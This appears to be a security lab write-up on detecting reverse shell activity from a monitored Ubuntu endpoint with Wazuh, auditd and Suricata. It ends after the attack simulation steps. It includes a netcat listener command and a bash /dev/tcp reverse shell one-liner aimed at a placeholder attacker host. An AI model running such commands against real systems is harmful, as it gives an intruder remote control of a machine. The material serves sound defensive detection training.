# Reverse Shell Detection

## Objective

Detect and investigate reverse shell activity originating from a monitored Linux endpoint using Wazuh SIEM and supporting endpoint telemetry.

---

## Overview

A reverse shell attack was simulated from a monitored Ubuntu endpoint to a Kali Linux attacker machine. The objective of this use case was to validate the ability of the SOC environment to identify suspicious shell execution and outbound attacker-controlled connections.

The activity was analyzed through Wazuh alerts, Linux logs, process activity, and network connections.

---

## Lab Environment

| Component | Purpose |
|---|---|
| Kali Linux | Attacker Machine |
| Ubuntu Server | Victim Endpoint |
| Wazuh Manager | SIEM & Alert Correlation |
| Auditd | Linux Auditing |
| Suricata | Network Monitoring |

---

## Attack Simulation

### Step 1 — Start Listener on Kali

```bash
nc -lvnp 4444
```

---

### Step 2 — Execute Reverse Shell on Target

```bash
bash -i >& /dev/tcp/<KALI-IP>/4444 0>&1
```

